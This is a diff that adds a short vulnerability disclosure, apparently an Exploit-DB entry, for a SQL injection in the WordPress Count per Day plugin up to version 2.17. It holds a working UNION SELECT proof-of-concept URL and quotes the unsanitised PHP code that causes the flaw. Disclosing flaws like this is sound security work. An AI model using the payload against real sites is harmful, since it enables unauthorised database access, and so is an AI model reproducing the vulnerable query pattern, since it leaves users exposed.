@@ -1,0 +1,31 @@
+# Exploit Title: WordPress Count per Day plugin <= 2.17 SQL Injection Vulnerability
+# Date: 2011-09-05
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/count-per-day.2.17.zip
+# Version: 2.17 (tested)
+# Note: Authors done one of dirtiest things I've seen in a while :)
+#       I've warned them 2 weeks ago about the vulnerability
+#       They've silently updated the affected v2.17 like nothing happened
+#       No mention of "security" fix in Changelog
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/count-per-day/notes.php?month=-1 UNION ALL SELECT 1,version(),current_user()--%20
+
+---------------
+Vulnerable code
+---------------
+if ( isset($_POST['month']) )
+	$month = $_POST['month']; // they've put (int) here
+else if ( isset($_GET['month']) )
+	$month = $_GET['month'];  // they've put (int) here
+else	
+	$month = date_i18n('m');
+...
+$where = '';
+if ( $month )
+	$where .= " AND MONTH(date) = $month "; 
+if ( $year )
+	$where .= " AND YEAR(date) = $year ";
+$notes = $wpdb->get_results('SELECT * FROM '.$table_prefix.'cpd_notes WHERE 1 '.$where.' ORDER BY date DESC', ARRAY_A);
